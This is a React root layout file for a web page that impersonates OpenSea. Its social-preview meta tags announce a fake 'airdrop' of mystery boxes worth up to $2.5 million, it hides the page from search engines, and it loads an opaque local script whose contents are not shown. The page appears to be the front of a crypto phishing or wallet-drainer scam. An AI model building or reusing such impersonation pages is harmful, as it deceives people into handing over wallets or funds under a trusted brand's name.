import React from "react";

function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en">
      <head>
        <meta charSet="UTF-8" />
        <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
        <title>Drop | OpenSea</title>

        {/* Open Graph Meta Tags */}
        <meta property="og:title" content="CLICK HERE TO CLAIM!" />
        <meta
          property="og:site_name"
          content="This is an automatically generated announcement message"
        />
        <meta
          property="og:description"
          content="🟢 AIRDROP IS LIVE NOW 🟢 🎉 Price: FREE 🎉 Supply: 150 Mystery Box 🎉 Reward: between $3000 and $2,530,000 TRY YOUR LUCK! 🚀"
        />
        <meta property="og:image" content="/images/Opensea-Pro-NFT.png" />
        <meta name="theme-color" content="#7289DA" />

        {/* Twitter Meta Tags */}
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:site" content="@opensea" />
        <meta name="twitter:title" content="CLICK HERE - OPENSEA PRO NFT" />
        <meta
          name="twitter:description"
          content="🟢 AIRDROP IS LIVE NOW 🟢 🎉 Price: FREE 🎉 Supply: 150 Mystery Box 🎉 Reward: between $3000 and $2,530,000 TRY YOUR LUCK! 🚀"
        />

        {/* Icons */}
        <link
          rel="apple-touch-icon"
          sizes="180x180"
          href="/images/apple-touch-icon.png"
        />
        <link
          rel="icon"
          type="image/png"
          sizes="32x32"
          href="/images/favicon-32x32.png"
        />
        <link
          rel="icon"
          type="image/png"
          sizes="16x16"
          href="/images/favicon-16x16.png"
        />
      </head>

      <body>
        {/* Render the page component */}
        <main>{children}</main>

        {/* Load external scripts at the end of the body */}
        <script
          src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
          integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
          crossOrigin="anonymous"
          defer
        ></script>
        <script
          src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"
          integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy"
          crossOrigin="anonymous"
          defer
        ></script>
        <script src="/scripts/679c672ed913a9b8e6caccbe.js" defer />
      </body>
    </html>
  );
}

export default RootLayout;
